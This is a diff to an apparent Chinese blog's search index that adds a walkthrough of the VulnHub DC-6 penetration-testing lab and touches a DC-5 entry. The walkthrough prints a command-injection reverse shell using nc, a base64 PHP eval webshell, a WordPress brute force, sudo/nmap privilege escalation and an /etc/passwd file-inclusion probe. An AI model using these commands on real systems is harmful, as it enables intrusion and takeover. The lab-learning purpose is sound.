@@ -285,6 +285,73 @@
       </tags>
   </entry>
   <entry>
+    <title>DC-6</title>
+    <url>/2022/04/22/DC-6/</url>
+    <content><![CDATA[<p>渗透环境：DC6 <a href="https://www.vulnhub.com/entry/dc-6,315/">https://www.vulnhub.com/entry/dc-6,315/</a><br>攻击机：192.168.168.128<br>靶机：ip地址未知, 已知ip与攻击机在同一网段下</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="主机存活扫描"><a href="#主机存活扫描" class="headerlink" title="主机存活扫描"></a>主机存活扫描</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.168.0/24</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/22/DC-6/1.png" alt="img"></p>
+<p>靶机ip为192.168.168.134</p>
+<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sS -p- 192.168.168.134</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/22/DC-6/2.png" alt="img"></p>
+<h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://wordy/ -e *</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/22/DC-6/4.png" alt="img"></p>
+<p>发现wordpress后台</p>
+<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>使用wpscan扫描</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wpscan --url http://wordy  --enumerate</span><br></pre></td></tr></table></figure>
+
+<p>发现存在的用户</p>
+<p><img src="/2022/04/22/DC-6/3.png" alt="img"></p>
+<p>使用burp进行爆破，失败<br>在原文下发现提示</p>
+<p><img src="/2022/04/22/DC-6/5.png" alt="img"></p>
+<p>使用提示中的字典</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt</span><br></pre></td></tr></table></figure>
+
+<p>爆破成功</p>
+<p><img src="/2022/04/22/DC-6/6.png" alt="img"></p>
+<p>登录后台寻找突破口<br>发现一次存在命令执行的地方<br>在kali开启监听端口</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvnp 4444</span><br></pre></td></tr></table></figure>
+
+<p>抓包修改</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">127.0.0.1 | nc 192.168.168.128 4444 -e /bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>发送<br>上传木马</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;PD9waHAgQGV2YWwoJF9QT1NUWydMMWFuZyddKTs/Pg==&quot;</span>|<span class="built_in">base64</span> -d &gt; shell.php</span><br></pre></td></tr></table></figure>
+
+<p>蚁剑连接<br>在home下发现线索</p>
+<p><img src="/2022/04/22/DC-6/8.png" alt="img"></p>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>ssh连接<br>账号：graham<br>密码：GSo7isUM1D4</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/22/DC-6/9.png" alt="img"></p>
+<p>发现 &#x2F;home&#x2F;jens&#x2F;backups.sh没有密码<br>往里面添上&#x2F;bin&#x2F;bash</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> /bin/bash &gt;&gt; /home/jens/backups.sh</span><br></pre></td></tr></table></figure>
+
+<p>以jens的身份执行</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -u jens /home/jens/backups.sh</span><br></pre></td></tr></table></figure>
+
+<p>发现当前身份变为jens</p>
+<p><img src="/2022/04/22/DC-6/10.png" alt="img"></p>
+<p>nmap提权</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;os.execute(&quot;/bin/bash&quot;)&#x27;</span> &gt; /tmp/shell</span><br><span class="line">sudo  nmap  --script= /tmp/shell</span><br></pre></td></tr></table></figure>
+
+<p>提权成功</p>
+<p><img src="/2022/04/22/DC-6/11.png" alt="img"></p>
+<p>查看flag</p>
+<p><img src="/2022/04/22/DC-6/12.png" alt="img"></p>
+<p>DC-6 clear</p>
+]]></content>
+      <categories>
+        <category>实践</category>
+      </categories>
+      <tags>
+        <tag>渗透</tag>
+        <tag>提权</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>DC-5</title>
     <url>/2022/04/17/DC-5/</url>
     <content><![CDATA[<p>渗透环境：DC5 <a href="https://www.vulnhub.com/entry/dc-5,314/">https://www.vulnhub.com/entry/dc-5,314/</a><br>攻击机：192.168.168.128<br>靶机：ip地址未知, 已知ip与攻击机在同一网段下</p>
@@ -298,7 +365,7 @@
 <p><img src="/2022/04/17/DC-5/2.png" alt="img"></p>
 <p>开放了80端口浏览器打开</p>
 <p><img src="/2022/04/17/DC-5/3.png" alt="img"></p>
-<p>只看到这个页面有注入的可能，试试<br>然后返回了thankyou.php过来</p>
+<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>只看到这个页面有注入的可能，试试<br>然后返回了thankyou.php过来</p>
 <p><img src="/2022/04/17/DC-5/4.png" alt="img"></p>
 <p>看看有没有存在sql注入，xss注入的可能<br>测试过，没反应<br>最后发现可以文件包含</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=/etc/passwd</span><br></pre></td></tr></table></figure>
